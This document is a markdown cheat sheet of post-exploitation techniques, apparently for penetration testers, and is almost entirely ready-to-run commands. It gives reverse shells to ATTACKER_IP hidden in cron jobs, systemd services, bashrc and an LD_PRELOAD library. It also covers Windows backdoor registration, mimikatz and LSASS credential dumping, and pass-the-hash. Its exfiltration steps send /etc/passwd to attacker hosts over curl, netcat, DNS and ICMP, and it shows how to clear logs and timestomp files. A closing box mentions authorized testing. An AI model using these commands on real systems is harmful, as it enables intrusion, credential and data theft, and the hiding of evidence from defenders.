# Post-Exploitation Techniques

> Maintaining access, lateral movement, and demonstrating impact after initial compromise.

---

## Persistence Mechanisms

### 1.1 Linux Persistence

**Cron Jobs**:
```bash
# User crontab
crontab -e
# Add: * * * * * /tmp/backdoor.sh

# System crontab
echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab

# Cron directories
echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > /etc/cron.hourly/backdoor
chmod +x /etc/cron.hourly/backdoor
```

**SSH Keys**:
```bash
# Add attacker's public key
mkdir -p ~/.ssh
echo "ssh-rsa AAAA...attacker_key...== attacker@host" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# Generate key on target for pivot
ssh-keygen -t rsa -f ~/.ssh/pivot_key -N ""
```

**Systemd Services**:
```bash
# Create service file
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Daemon
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service
```

**bashrc/profile**:
```bash
# User-level persistence
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &' >> ~/.bashrc

# System-level
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &' >> /etc/profile
```

**LD_PRELOAD**:
```c
// backdoor.c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    if (fork() == 0) {
        system("bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1");
    }
}

// Compile
// gcc -shared -fPIC -o /tmp/backdoor.so backdoor.c

// Persist
// echo "/tmp/backdoor.so" >> /etc/ld.so.preload
```

### 1.2 Windows Persistence

**Registry Run Keys**:
```powershell
# Current user
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe"

# All users (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"
```

**Scheduled Tasks**:
```powershell
# Create scheduled task
schtasks /create /tn "System Update" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru SYSTEM

# Using PowerShell
$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -RunLevel Highest
```

**WMI Subscription**:
```powershell
# Create WMI event subscription
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "UpdateFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 00"
}

$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "UpdateConsumer"
    CommandLineTemplate = "C:\Windows\Temp\backdoor.exe"
}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

**Services**:
```powershell
# Create service
sc create "Windows Update Service" binpath= "C:\Windows\Temp\backdoor.exe" start= auto

# Using PowerShell
New-Service -Name "WinUpdate" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -StartupType Automatic
Start-Service -Name "WinUpdate"
```

---

## Lateral Movement

### 2.1 Windows Lateral Movement

**PsExec**:
```bash
# Impacket psexec
impacket-psexec domain/user:password@target

# With hash
impacket-psexec -hashes :NTLM_HASH admin@target

# Sysinternals PsExec
PsExec.exe \\target -u domain\admin -p password cmd.exe
```

**WMI**:
```bash
# Impacket wmiexec
impacket-wmiexec domain/user:password@target

# PowerShell
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -e BASE64_PAYLOAD" -ComputerName target -Credential $cred
```

**WinRM**:
```powershell
# Enable WinRM
Enable-PSRemoting -Force

# Connect to remote system
$cred = Get-Credential
Enter-PSSession -ComputerName target -Credential $cred

# Execute command remotely
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock { whoami }
```

**Pass-the-Hash**:
```bash
# Using CrackMapExec
crackmapexec smb target -u admin -H NTLM_HASH

# Using evil-winrm
evil-winrm -i target -u admin -H NTLM_HASH

# Using xfreerdp
xfreerdp /v:target /u:admin /pth:NTLM_HASH
```

**Pass-the-Ticket**:
```powershell
# Export ticket (Rubeus)
Rubeus.exe dump

# Import ticket
Rubeus.exe ptt /ticket:base64_ticket

# Or with mimikatz
kerberos::ptt ticket.kirbi

# Use ticket
dir \\target\c$
```

### 2.2 Linux Lateral Movement

**SSH**:
```bash
# With key
ssh -i stolen_key user@target

# ProxyJump (pivoting)
ssh -J user@jump_host user@internal_target

# Port forwarding for internal access
ssh -L 8080:internal:80 user@jump_host
```

**SSH Hijacking**:
```bash
# Find active SSH sessions
ps aux | grep ssh

# Inject into SSH agent
SSH_AUTH_SOCK=$(find /tmp -name "agent.*" 2>/dev/null | head -1)
export SSH_AUTH_SOCK
ssh-add -l  # List available keys
ssh user@target  # Use stolen identity
```

---

## Credential Harvesting

### 3.1 Windows Credentials

**Mimikatz**:
```powershell
# Dump credentials from memory
sekurlsa::logonpasswords

# Dump SAM database
lsadump::sam

# Dump domain cached credentials
lsadump::cache

# DCSync attack (requires DA privileges)
lsadump::dcsync /domain:domain.local /user:Administrator
```

**SAM/SYSTEM Extraction**:
```bash
# From Windows
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SECURITY SECURITY

# Extract hashes (offline)
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

**LSASS Dump**:
```powershell
# Using procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Using comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\lsass.dmp full

# Parse dump offline
pypykatz lsa minidump lsass.dmp
```

### 3.2 Linux Credentials

**Shadow File**:
```bash
# If readable
cat /etc/shadow

# Crack with hashcat
hashcat -m 1800 shadow_hashes wordlist.txt  # SHA-512
hashcat -m 500 shadow_hashes wordlist.txt   # MD5
```

**Memory Dump**:
```bash
# Dump process memory
gcore -o dump PID
strings dump.* | grep -i password

# mimipenguin
python3 mimipenguin.py
```

**SSH Keys**:
```bash
# Find SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Search for passphrases in history
cat ~/.bash_history | grep -i "ssh-"
```

**Application Credentials**:
```bash
# Database configs
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
cat /var/www/html/wp-config.php
cat /var/www/html/.env

# Browser credentials
ls ~/.mozilla/firefox/*.default/logins.json
ls ~/.config/google-chrome/Default/Login\ Data
```

---

## Data Exfiltration

### 4.1 File Transfer Methods

**HTTP**:
```bash
# Start Python server on attacker
python3 -m http.server 8000

# Download on target
wget http://attacker:8000/file
curl http://attacker:8000/file -o file
certutil -urlcache -f http://attacker:8000/file file

# Upload via POST
curl -X POST -F "file=@/etc/passwd" http://attacker:8000/upload

# Using netcat
nc attacker 1234 < /etc/passwd
```

**SMB**:
```bash
# Start SMB server on attacker
impacket-smbserver share /tmp/share -smb2support

# Download on Windows target
copy \\attacker\share\file.exe C:\Windows\Temp\
net use \\attacker\share

# Upload
copy C:\sensitive.txt \\attacker\share\
```

**DNS Tunneling**:
```bash
# Using dnscat2
# Attacker: dnscat2-server attacker.com
# Target: dnscat2 attacker.com

# Manual base64 over DNS
data=$(cat /etc/passwd | base64 | tr -d '\n')
for chunk in $(echo $data | fold -w 60); do
    nslookup $chunk.attacker.com
done
```

### 4.2 Covert Channels

**ICMP Exfiltration**:
```bash
# Using ping (small amounts)
xxd -p /etc/passwd | while read line; do ping -c 1 -p $line attacker; done

# Using icmpsh
# Attacker: python icmpsh_m.py attacker_ip target_ip
# Target: icmpsh.exe -t attacker_ip
```

**Steganography**:
```bash
# Hide data in image
steghide embed -cf image.jpg -ef secret.txt

# Extract data
steghide extract -sf image.jpg
```

**Cloud Storage**:
```bash
# Exfil to pastebin-like services
data=$(cat /etc/passwd | base64)
curl -X POST -d "content=$data" https://paste.service/api

# To legitimate cloud storage
rclone copy /sensitive data: remote:bucket/
```

---

## Covering Tracks

### 5.1 Log Manipulation

**Linux Logs**:
```bash
# Clear auth log
echo "" > /var/log/auth.log
cat /dev/null > /var/log/auth.log

# Clear specific entries
sed -i '/attacker_ip/d' /var/log/auth.log

# Clear bash history
history -c
cat /dev/null > ~/.bash_history
unset HISTFILE

# Timestomp files
touch -r /etc/passwd /tmp/backdoor.sh
```

**Windows Logs**:
```powershell
# Clear event logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# PowerShell
Clear-EventLog -LogName Security, System, Application

# Disable logging
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
```

### 5.2 Anti-Forensics

**Timestomping**:
```bash
# Linux
touch -d "2020-01-01 00:00:00" /tmp/backdoor

# Windows (PowerShell)
$(Get-Item file.exe).CreationTime = "01/01/2020 00:00:00"
$(Get-Item file.exe).LastWriteTime = "01/01/2020 00:00:00"
$(Get-Item file.exe).LastAccessTime = "01/01/2020 00:00:00"
```

**Secure Deletion**:
```bash
# Linux
shred -u file
dd if=/dev/urandom of=file bs=1 count=$(stat -c %s file)

# Windows
cipher /w:C:\path\to\folder
```

---

## Quick Reference

### Post-Exploitation Checklist

```
□ Establish Persistence
  □ Add SSH key / Create user
  □ Install backdoor service
  □ Set up cron/scheduled task

□ Credential Harvesting
  □ Dump memory (mimikatz/lsass)
  □ Extract SAM/shadow
  □ Search for stored credentials
  □ Capture network traffic

□ Internal Reconnaissance
  □ Network mapping
  □ Active Directory enumeration
  □ Service discovery
  □ Identify high-value targets

□ Lateral Movement
  □ Test captured credentials
  □ Pivot to new systems
  □ Access sensitive data

□ Data Collection
  □ Identify sensitive files
  □ Screenshot/keylog (if in scope)
  □ Database access

□ Exfiltration (if in scope)
  □ Choose appropriate method
  □ Encrypt data before transfer
  □ Document what was taken

□ Clean Up (CRITICAL)
  □ Remove tools and backdoors
  □ Clear logs if authorized
  □ Document all changes made
```

### Tools Summary

| Phase | Linux | Windows |
|-------|-------|---------|
| **Persistence** | cron, systemd, SSH | Registry, Tasks, WMI |
| **Credential** | mimipenguin, shadow | mimikatz, secretsdump |
| **Lateral** | SSH, stolen keys | PsExec, WMI, WinRM |
| **Exfil** | nc, curl, DNS | certutil, SMB, PowerShell |
| **Cleanup** | shred, log edits | cipher, wevtutil |

### Detection Reminders

```
IMPORTANT: In authorized testing, you should:
1. Coordinate with blue team on detection expectations
2. Use unique indicators that can be identified
3. Document all actions with timestamps
4. Avoid actual data exfiltration unless explicitly authorized
5. Clean up thoroughly after engagement
```
